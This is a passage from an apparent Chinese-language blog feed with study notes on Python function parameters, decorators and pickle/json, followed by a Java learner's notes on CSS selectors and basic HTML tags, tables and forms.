<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>最后一个函数在同一个函数定义中，使用了全部三种调用惯例：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>

<p>下面的函数定义中，<code>kwds</code> 把 <code>name</code> 当作键，因此，可能与位置参数 <code>name</code> 产生潜在冲突：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>

<p>调用该函数不可能返回 <code>True</code>，因为关键字 <code>&#39;name&#39;</code> 总与第一个形参绑定。例如：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>加上 <code>/</code> （仅限位置参数）后，就可以了。此时，函数定义把 <code>name</code> 当作位置参数，<code>&#39;name&#39;</code> 也可以作为关键字参数的键：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>换句话说，仅限位置形参的名称可以在 <code>**kwds</code> 中使用，而不产生歧义。</p>
<p><strong>取自python官方文档</strong></p>
<h1 id="二、装饰器"><a href="#二、装饰器" class="headerlink" title="二、装饰器"></a>二、装饰器</h1><p>可以通过修饰去简化代码并且达到相应的目的。</p>
<h2 id="1、装饰器雏形"><a href="#1、装饰器雏形" class="headerlink" title="1、装饰器雏形"></a>1、装饰器雏形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打开外挂&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;关闭外挂&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊！我叫赛利亚，今天又是美好的一天！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎来到英雄联盟&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>

<p>这就是一个简单的装饰器，通过这种方法就能使我们更方便的对函数进行相关的加装以及优化，</p>
<h2 id="2、装饰器的简单应用"><a href="#2、装饰器的简单应用" class="headerlink" title="2、装饰器的简单应用"></a>2、装饰器的简单应用</h2><p>在一些程序应用当中，我们会需要利用到登入的操作，这个时候我们就会想要实现，去实现什么功能之前需要先登入，这个时候装饰器就有用武之地了。不多说，直接看个小案例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请先登录&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还未完成用户登录操作&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;用户名或密码错误，请重新输入&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的订单&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的资料&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>

<p>之后的相应是</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/装饰器应用.py</span><br><span class="line">请先登录</span><br><span class="line">还未完成用户登录操作</span><br><span class="line">请输入用户名：admin</span><br><span class="line">请输入密码：<span class="number">123456</span></span><br><span class="line">登录成功</span><br><span class="line">欢迎来到首页</span><br><span class="line">欢迎来到我的订单</span><br><span class="line">欢迎来到我的资料</span><br></pre></td></tr></table></figure>

<h1 id="三、Pickle和Json模块的总结"><a href="#三、Pickle和Json模块的总结" class="headerlink" title="三、Pickle和Json模块的总结"></a>三、Pickle和Json模块的总结</h1><p>Pickle是将对象（数据）转化为字节，json是将对象（数据）转化为json格式</p>
<blockquote>
<p>1、dumps    把对象（数据）转化为字节</p>
<p>2、loads       把字节转化回对象（数据）</p>
<p>3、dump      把对象序列化成字节之后写入到文件</p>
<p>3、load         把文件中的字节反序列化成对象 </p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>java学习历程记录-前端基础</title>
    <url>/2023/11/21/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>其实java是之前一段时间学习的，但是学到一半的时候发现我的python能力不行，所以又转去学python了，然后又由于我之前没有记笔记的习惯，就导致我现在再回来看java，就基本上忘光了，所以想着借着写博客的功夫去将我的一些java学习历程记录下来，也能去好好的复习一下之前的知识。所以这篇文章并不主要是为了入门，更多的只是我自己的一个学习记录，仅限参考。</p>
<span id="more"></span>

<h1 id="一、一些基础的前端知识"><a href="#一、一些基础的前端知识" class="headerlink" title="一、一些基础的前端知识"></a>一、一些基础的前端知识</h1><h2 id="1、css中的元素选择器"><a href="#1、css中的元素选择器" class="headerlink" title="1、css中的元素选择器:"></a>1、css中的元素选择器:</h2><p>顾名思义：选择器是选取需设置样式的元素（标签），但是我们根据业务场景不同，选择的标签的需求也是多种多样的，所以选择器有很多种，因为我们是做后台开发的，所以对于css选择器，我们只学习最基本的3种。</p>
<p><strong>选择器通用语法如下</strong>：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">选择器名   &#123;</span><br><span class="line">    css样式名：css样式值;</span><br><span class="line">    css样式名：css样式值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要学习的3种选择器是元素选择器，id选择器，class选择器，语法以及作用如下：</p>
<h3 id="1-元素（标签）选择器："><a href="#1-元素（标签）选择器：" class="headerlink" title="1.元素（标签）选择器："></a><strong>1.元素（标签）选择器：</strong></h3><ul>
<li>选择器的名字必须是标签的名字</li>
<li>作用：选择器中的样式会作用于所有同名的标签上</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">元素名称 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-id选择器"><a href="#2-id选择器" class="headerlink" title="2.id选择器:"></a><strong>2.id选择器:</strong></h3><ul>
<li>选择器的名字前面需要加上#</li>
<li>作用：选择器中的样式会作用于指定id的标签上，而且有且只有一个标签（由于id是唯一的）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#id属性值 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#did</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-类选择器："><a href="#3-类选择器：" class="headerlink" title="3.类选择器："></a><strong>3.类选择器：</strong></h3><ul>
<li>选择器的名字前面需要加上 .</li>
<li>作用：选择器中的样式会作用于所有class的属性值和该名字一样的标签上，可以是多个</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.class属性值 &#123;</span><br><span class="line">    css样式名:css样式值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.cls</span>&#123;</span><br><span class="line">     <span class="attribute">color</span>: green;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、一些常见的html标签"><a href="#2、一些常见的html标签" class="headerlink" title="2、一些常见的html标签"></a>2、一些常见的html标签</h2><h3 id="1-视频、音频标签"><a href="#1-视频、音频标签" class="headerlink" title="1). 视频、音频标签"></a><strong>1). 视频、音频标签</strong></h3><ul>
<li><p>视频标签: &lt;video&gt;</p>
<ul>
<li>属性: <ul>
<li>src: 规定视频的url</li>
<li>controls: 显示播放控件</li>
<li>width: 播放器的宽度</li>
<li>height: 播放器的高度</li>
</ul>
</li>
</ul>
</li>
<li><p>音频标签: &lt;audio&gt;</p>
<ul>
<li>属性:<ul>
<li>src: 规定音频的url</li>
<li>controls: 显示播放控件</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-段落标签"><a href="#2-段落标签" class="headerlink" title="2). 段落标签"></a><strong>2). 段落标签</strong></h3><ul>
<li><p>换行标签: &lt;br&gt;</p>
<ul>
<li>注意: 在HTML页面中,我们在编辑器中通过回车实现的换行, 仅仅在文本编辑器中会看到换行效果, 浏览器是不会解析的, HTML中换行需要通过br标签</li>
</ul>
</li>
<li><p>段落标签: &lt;p&gt;</p>
<ul>
<li>如: &lt;p&gt; 这是一个段落 &lt;&#x2F;p&gt;</li>
</ul>
</li>
</ul>
<h3 id="3-文本格式标签"><a href="#3-文本格式标签" class="headerlink" title="3). 文本格式标签"></a><strong>3). 文本格式标签</strong></h3><table>
<thead>
<tr>
<th>效果</th>
<th>标签</th>
<th>标签(强调)</th>
</tr>
</thead>
<tbody><tr>
<td>加粗</td>
<td>b</td>
<td>strong</td>
</tr>
<tr>
<td>倾斜</td>
<td>i</td>
<td>em</td>
</tr>
<tr>
<td>下划线</td>
<td>u</td>
<td>ins</td>
</tr>
<tr>
<td>删除线</td>
<td>s</td>
<td>del</td>
</tr>
</tbody></table>
<p>前面的标签 b、i、u、s 就仅仅是实现加粗、倾斜、下划线、删除线的效果，是没有强调语义的。 而后面的strong、em、ins、del在实现加粗、倾斜、下划线、删除线的效果的同时，还带有强调语义。</p>
<blockquote>
<p>注意事项: </p>
<ul>
<li><p>在HTML页面中无论输入了多少个空格, 最多只会显示一个。 可以使用空格占位符（&amp;nbsp；）来生成空格，如果需要多个空格，就使用多次占位符。</p>
</li>
<li><p>那在HTML中，除了空格占位符以外，还有一些其他的占位符(了解, 只需要知道空格的占位符写法即可)，如下：</p>
<ul>
<li><table>
<thead>
<tr>
<th align="left">显示结果</th>
<th align="left">描述</th>
<th align="left">占位符</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">空格</td>
<td align="left">&amp;nbsp;</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于号</td>
<td align="left">&amp;lt;</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于号</td>
<td align="left">&amp;gt;</td>
</tr>
<tr>
<td align="left">&amp;</td>
<td align="left">和号</td>
<td align="left">&amp;amp;</td>
</tr>
<tr>
<td align="left">“</td>
<td align="left">引号</td>
<td align="left">&amp;quot;</td>
</tr>
<tr>
<td align="left">‘</td>
<td align="left">撇号</td>
<td align="left">&amp;apos;</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="4-布局美化"><a href="#4-布局美化" class="headerlink" title="4).布局美化"></a>4).布局美化</h3><h4 id="①盒子模型"><a href="#①盒子模型" class="headerlink" title="①盒子模型"></a>①盒子模型</h4><ul>
<li><p>盒子：页面中所有的元素（标签），都可以看做是一个 盒子，由盒子将页面中的元素包含在一个矩形区域内，通过盒子的视角更方便的进行页面布局</p>
</li>
<li><p>盒子模型组成：内容区域（content）、内边距区域（padding）、边框区域（border）、外边距区域（margin）</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f529eda86837643eb1ca32955d5c36f6--cead--image-20230310092820616.png" alt="image-20230310092820616"></p>
<p>CSS盒子模型，其实和日常生活中的包装盒是非常类似的，就比如：</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/0f2a5351ad32ffa9c1fe2588bec73ffd--df3d--image-20230310093247265.png" alt="image-20230310093247265"></p>
<p>盒子的大小，其实就包括三个部分： border、padding、content，而margin外边距是不包括在盒子之内的。</p>
<p>盒子模型代码示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>盒子模型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;  <span class="comment">/* 宽度 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;  <span class="comment">/* 高度 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 指定width height为盒子的高宽 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: aquamarine; <span class="comment">/* 背景色 */</span></span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span>; <span class="comment">/* 内边距, 上 右 下 左 , 边距都一行, 可以简写: padding: 20px;*/</span> </span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">10px</span> solid red; <span class="comment">/* 边框, 宽度 线条类型 颜色 */</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span>; <span class="comment">/* 外边距, 上 右 下 左 , 边距都一行, 可以简写: margin: 30px; */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A A </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4d2ca694e5a1c402d403f1a675b553da--1cdb--image-20231121183250787.png" alt="image-20231121183250787"></p>
<h4 id="②布局标签"><a href="#②布局标签" class="headerlink" title="②布局标签"></a>②布局标签</h4><ul>
<li><p>布局标签：实际开发网页中，会大量频繁的使用 div 和 span 这两个没有语义的布局标签。</p>
</li>
<li><p>标签：<div> <span></p>
</li>
<li><p>特点：</p>
<ul>
<li><p>div标签：</p>
<ul>
<li><p>一行只显示一个（独占一行）</p>
</li>
<li><p>宽度默认是父元素的宽度，高度默认由内容撑开</p>
</li>
<li><p>可以设置宽高（width、height）</p>
</li>
</ul>
</li>
<li><p>span标签：</p>
<ul>
<li><p>一行可以显示多个</p>
</li>
<li><p>宽度和高度默认由内容撑开</p>
</li>
<li><p>不可以设置宽高（width、height）</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-表格标签"><a href="#5-表格标签" class="headerlink" title="5).表格标签"></a>5).表格标签</h3><p><strong>标签：</strong></p>
<ul>
<li><p>&lt;table&gt; : 用于定义整个表格, 可以包裹多个 &lt;tr&gt;， 常用属性如下： </p>
<ul>
<li>border：规定表格边框的宽度</li>
<li>width：规定表格的宽度</li>
<li>cellspacing: 规定单元之间的空间</li>
</ul>
</li>
<li><p>&lt;tr&gt; : 表格的行，可以包裹多个 &lt;td&gt;  </p>
</li>
<li><p>&lt;td&gt; : 表格单元格(普通)，可以包裹内容 , 如果是表头单元格，可以替换为 &lt;th&gt;</p>
</li>
</ul>
<p><strong>演示：</strong></p>
<p>代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表格<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center; <span class="comment">/* 单元格内容居中展示 */</span></span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>序号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>品牌Logo<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>品牌名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>企业名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/huawei.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>华为<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>华为技术有限公司<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;img/alibaba.jpg&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>阿里<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>阿里巴巴集团控股有限公司<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开浏览器，效果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/582d460a041f8a2b306cebd22a6333f9--f915--image-20231121183451283.png" alt="image-20231121183451283"></p>
<p>整合表格使用 table 标签包裹 , 其中的每一行数据都是一个 tr , 每一行中的每一个单元格都是一个 td , 而如果是表头单元格, 可以使用 th (具有加粗居中展示的效果)。</p>
<h3 id="6-表单标签（数据提交）"><a href="#6-表单标签（数据提交）" class="headerlink" title="6).表单标签（数据提交）"></a>6).表单标签（数据提交）</h3><p>那表单呢,在我们日常的上网的过程中,基本上每天都会遇到。比如，我们经常在访问网站时，出现的登录页面、注册页面、个人信息提交页面，其实都是一个一个的表单 。 当我们在这些表单中录入数据之后，一点击 “提交”，就会将表单中我们填写的数据采集到，并提交， 那其实这个数据呢，一般会提交到服务端，最终保存在数据库中 （后面的课程中会讲到）。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/158ab888ad88adfdda5cce236171acbc--b1b4--image-20231121183623494.png"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f0994b8edc9b5e7ce1a8ad860729d313--0da3--image-20231121183653494.png" alt="image-20231121183653494"></p>
<p>那其实，上述的整个窗口是一个表单，而表单是一项一项的，这个我们称为表单项 或 表单元素。</p>
<ul>
<li><p>表单场景: 表单就是在网页中负责数据采集功能的，如：注册、登录的表单。 </p>
</li>
<li><p>表单标签: &lt;form&gt;</p>
</li>
<li><p>表单属性:</p>
<ul>
<li>action: 规定表单提交时，向何处发送表单数据，表单提交的URL。</li>
<li>method: 规定用于发送表单数据的方式，常见为： GET、POST。<ul>
<li>GET：表单数据是拼接在url后面的， 如： xxxxxxxxxxx?username&#x3D;Tom&amp;age&#x3D;12，url中能携带的表单数据大小是有限制的。</li>
<li>POST： 表单数据是在请求体（消息体）中携带的，大小没有限制。</li>
</ul>
</li>
</ul>
</li>
<li><p>表单项标签: 不同类型的input元素、下拉列表、文本域等。</p>
<ul>
<li>input: 定义表单项，通过type属性控制输入形式</li>
<li>select: 定义下拉列表</li>
